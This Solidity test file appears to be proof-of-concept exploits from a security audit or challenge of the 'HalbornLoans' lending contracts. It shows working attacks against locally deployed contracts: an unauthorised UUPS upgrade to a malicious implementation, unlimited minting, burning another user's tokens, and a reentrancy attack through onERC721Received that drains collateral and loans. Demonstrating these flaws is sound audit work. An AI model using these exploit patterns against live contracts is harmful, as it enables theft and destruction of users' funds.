// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {HalbornToken} from "../src/HalbornToken.sol";

// Malicious contract to simulate upgrade attack
import {HalbornLoans_UUPSattack} from "../src/exploit/HalbornLoansExploit.sol";

/**
 * @title HalbornLoans_Test - Critical UUPS and Reentrancy Exploits
 * @dev This contract demonstrates multiple critical vulnerabilities in the HalbornLoans contract:
 *
 * EXPLOIT VECTORS COVERED:
 * 1. UUPS Upgrade Bypass (Critical) - Anyone can upgrade the contract
 * 2. Arbitrary Token Minting (Critical) - Post-upgrade token inflation
 * 3. Arbitrary Token Burning (Critical) - Post-upgrade fund destruction
 * 4. Reentrancy Attack (Critical) - Bypass collateral accounting via onERC721Received
 *
 * ROOT CAUSE: Empty _authorizeUpgrade() function allows unrestricted upgrades
 * IMPACT: Complete protocol takeover, infinite token minting, user fund theft
 */
contract HalbornLoans_Test is Test {
    HalbornLoans public loans;
    ERC1967Proxy public loanProxy;
    HalbornLoans public loanImpl;

    HalbornToken public token;
    ERC1967Proxy tokenProxy;
    HalbornToken tokenImpl;

    HalbornNFT public nft;
    ERC1967Proxy nftProxy;
    HalbornNFT nftImpl;

    function setUp() public {
        // Deploy token implementation and proxy
        tokenImpl = new HalbornToken();
        tokenProxy = new ERC1967Proxy(address(tokenImpl), "");
        token = HalbornToken(address(tokenProxy));
        token.initialize();

        // Deploy NFT implementation and proxy
        nftImpl = new HalbornNFT();
        nftProxy = new ERC1967Proxy(address(nftImpl), "");
        nft = HalbornNFT(address(nftProxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);

        // Deploy loan implementation with dummy collateral value
        loanImpl = new HalbornLoans(100);
        bytes memory initData = abi.encodeWithSelector(
            HalbornLoans.initialize.selector,
            address(token),
            address(nft)
        );
        loanProxy = new ERC1967Proxy(address(loanImpl), initData);
        loans = HalbornLoans(address(loanProxy));

        // Authorize loan contract to mint/burn tokens
        token.setLoans(address(loans));
    }

    // Critical Exploit 1: Anyone can call upgradeTo — no access control
    /**
     * @dev EXPLOIT: UUPS Upgrade Bypass Attack
     *
     * VULNERABILITY: HalbornLoans inherits from UUPSUpgradeable but has empty _authorizeUpgrade()
     * ATTACK VECTOR: Any address can call upgradeTo() and replace the implementation
     *
     * EXPLOIT STEPS:
     * 1. Deploy malicious implementation contract (HalbornLoans_UUPSattack)
     * 2. Call upgradeTo() with malicious contract address (NO AUTHORIZATION CHECK)
     * 3. Re-initialize with attacker as owner
     * 4. Now attacker controls the entire loans contract
     *
     * IMPACT: Complete protocol takeover, can drain all funds
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Deploy malicious implementation with attacker as owner
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        // CRITICAL: This should fail but doesn't due to empty _authorizeUpgrade()
        loans.upgradeTo(address(attack));
        // Re-initialize to set attacker as owner
        loans.initialize(address(1), address(1));
    }

    // Critical Exploit 2: Infinite token minting after malicious upgrade
    /**
     * @dev EXPLOIT: Post-Upgrade Token Inflation Attack
     *
     * VULNERABILITY: After UUPS upgrade, malicious contract can mint infinite tokens
     * ATTACK VECTOR: Leverage trusted relationship between loans and token contracts
     *
     * EXPLOIT STEPS:
     * 1. Upgrade loans contract to malicious implementation
     * 2. Initialize malicious contract with token address
     * 3. Call mint() function which calls token.mintToken(attacker, MAX_UINT256)
     * 4. Since token contract trusts loans contract, minting succeeds
     *
     * IMPACT: Infinite token supply, economic collapse, attacker becomes richest holder
     */
    function test_vulnerableLoanContractReksTokenMint() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = token.balanceOf(address(this));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Attacker can mint unlimited tokens:", false);

        // Step 1: Deploy and upgrade to malicious implementation
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        // Step 2: Cast proxy to malicious interface and initialize
        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(
            address(loanProxy)
        );
        hackedLoans.initialize(address(token), address(nft));

        // Step 3: CRITICAL - Mint maximum possible tokens to attacker
        // This works because token.setLoans() was called in setUp, creating trust
        hackedLoans.mint();

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = token.balanceOf(address(this));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens minted:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log(
            "Infinite minting achieved:",
            attackerBalanceAfter == type(uint256).max
        );

        // Step 4: Verify attacker now has infinite tokens
        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    // Critical Exploit 3: Burn tokens from any user after upgrade
    /**
     * @dev EXPLOIT: Post-Upgrade Token Destruction Attack
     *
     * VULNERABILITY: Malicious loans contract can burn tokens from any address
     * ATTACK VECTOR: Abuse trusted relationship to destroy user funds
     *
     * EXPLOIT STEPS:
     * 1. Upgrade loans contract to malicious implementation
     * 2. Initialize with token address to maintain trust relationship
     * 3. Call burn(victim) to destroy victim's tokens
     * 4. Victim loses all tokens, attacker can target multiple users
     *
     * IMPACT: Mass fund destruction, griefing attack, protocol death spiral
     */
    function test_vulnerableLoanContractReksTokenBurn() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        // Step 1: Deploy and upgrade to malicious implementation
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        // Step 2: Initialize malicious contract with token address
        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(
            address(loanProxy)
        );
        hackedLoans.initialize(address(token), address(nft));

        // Step 3: CRITICAL - Burn ALL of Alice's tokens without permission
        // This works because token contract trusts the loans contract
        hackedLoans.burn(alice);
        assertEq(token.balanceOf(alice), 0);

        // Step 4: Verify attacker maintains control (others can't upgrade)
        address hexWraith = address(0x314);
        vm.startPrank(hexWraith);
        HalbornLoans newLoan = new HalbornLoans(1e18);
        vm.expectRevert(); // Should revert because attacker owns upgrade rights
        hackedLoans.upgradeTo(address(newLoan));
    }

    // Critical Exploit 4: Reentrancy on withdrawCollateral bypasses internal accounting
    /**
     * @dev EXPLOIT: Reentrancy Attack on Collateral Withdrawal
     *
     * VULNERABILITY: withdrawCollateral() has no reentrancy protection
     * ATTACK VECTOR: Use onERC721Received callback to re-enter contract
     *
     * EXPLOIT STEPS:
     * 1. Deposit two NFTs as collateral (legitimate setup)
     * 2. Call withdrawCollateral(1) which triggers NFT transfer
     * 3. In onERC721Received callback, immediately call withdrawCollateral(2)
     * 4. Second call executes before first call's state updates complete
     * 5. Also call getLoan(MAX_UINT256) to drain maximum tokens
     *
     * IMPACT: Withdraw all collateral + drain maximum loan tokens
     */
    function test_Reentrancy() public {
        // Step 1: Legitimate setup - get two NFTs as intended by design
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        // Step 2: Deposit both NFTs as collateral
        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        // PROOF: State before exploit
        uint256 nftBalanceBefore = nft.balanceOf(address(this));
        uint256 tokenBalanceBefore = token.balanceOf(address(this));
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker NFT balance:", nftBalanceBefore);
        console.log("Attacker token balance:", tokenBalanceBefore);
        console.log("NFT 1 owner:", nft.ownerOf(1));
        console.log("NFT 2 owner:", nft.ownerOf(2));
        console.log("Can withdraw all collateral + drain tokens:", false);

        // Step 3: CRITICAL - Start reentrancy attack
        // Flag to trigger malicious behavior in onERC721Received
        startHack = true;
        loans.withdrawCollateral(1); // This will trigger the reentrancy chain

        // PROOF: State after exploit
        uint256 nftBalanceAfter = nft.balanceOf(address(this));
        uint256 tokenBalanceAfter = token.balanceOf(address(this));
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker NFT balance:", nftBalanceAfter);
        console.log("Attacker token balance:", tokenBalanceAfter);
        console.log("NFT 1 owner:", nft.ownerOf(1));
        console.log("NFT 2 owner:", nft.ownerOf(2));
        console.log("NFTs recovered:", nftBalanceAfter - nftBalanceBefore);
        console.log("Tokens drained:", tokenBalanceAfter - tokenBalanceBefore);
        console.log(
            "Reentrancy success:",
            nftBalanceAfter == 2 && tokenBalanceAfter == type(uint256).max
        );

        // Step 4: Verify successful attack - got both NFTs back
        assertEq(nft.ownerOf(1), address(this));
        assertEq(nft.ownerOf(2), address(this));

        // Step 5: Verify we also drained maximum tokens via getLoan() in callback
        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    bool public startHack = false;

    /**
     * @dev EXPLOIT CALLBACK: Reentrancy Entry Point
     *
     * VULNERABILITY: This callback is triggered during NFT transfers in withdrawCollateral()
     * ATTACK VECTOR: Re-enter the contract before state updates are finalized
     *
     * EXPLOIT LOGIC:
     * 1. When NFT ID 1 is transferred, immediately withdraw NFT ID 2
     * 2. Also call getLoan(MAX_UINT256) to drain maximum tokens
     * 3. This bypasses the contract's internal accounting because:
     *    - First withdrawal's state changes haven't been committed yet
     *    - Second withdrawal sees stale state and succeeds
     *    - Loan calculation uses corrupted collateral accounting
     *
     * RESULT: Get both NFTs back + maximum loan tokens = protocol drained
     */
    function onERC721Received(
        address,
        /* operator */ address,
        /* from */ uint256 tokenId,
        bytes calldata /* data */
    ) external returns (bytes4) {
        if (startHack) {
            startHack = false; // Prevent infinite recursion

            // CRITICAL: Re-enter to withdraw the other NFT
            loans.withdrawCollateral(tokenId == 1 ? 2 : 1);

            // CRITICAL: If this is the first NFT, also drain loan tokens
            if (tokenId == 1) {
                loans.getLoan(type(uint256).max);
            }
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
